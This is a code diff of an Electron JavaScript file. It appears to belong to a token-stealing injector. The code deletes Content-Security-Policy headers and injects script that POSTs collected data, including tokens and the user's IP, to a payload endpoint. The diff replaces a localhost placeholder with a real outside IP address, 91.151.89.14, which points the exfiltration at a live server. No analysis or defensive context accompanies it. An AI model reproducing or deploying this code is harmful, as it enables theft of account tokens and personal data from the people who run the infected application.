@@ -22,7 +22,7 @@ session.defaultSession.webRequest.onBeforeRequest({
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     delete details.responseHeaders['content-security-policy'];
     delete details.responseHeaders['content-security-policy-report-only'];
-    if (details.url == 'http://localhost/payload') {
+    if (details.url == 'http://91.151.89.14:443/payload') {
         callback({
             'responseHeaders': {
                 ...details.responseHeaders
@@ -42,7 +42,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 function sendToApi(data) {
     const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(' \n' + ' var xhr = new XMLHttpRequest();\n' + ' xhr.open("POST", "http://localhost/payload", true);\n' + " xhr.setRequestHeader('Content-Type', 'application/json');\n" + " xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n" + ' xhr.send(JSON.stringify(' + data + '));\n ', true);
+    window.webContents.executeJavaScript(' \n' + ' var xhr = new XMLHttpRequest();\n' + ' xhr.open("POST", "http://91.151.89.14:443/payload", true);\n' + " xhr.setRequestHeader('Content-Type', 'application/json');\n" + " xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n" + ' xhr.send(JSON.stringify(' + data + '));\n ', true);
 }
 async function newData(type, token, ...args) {
     const ip = await getIp() 
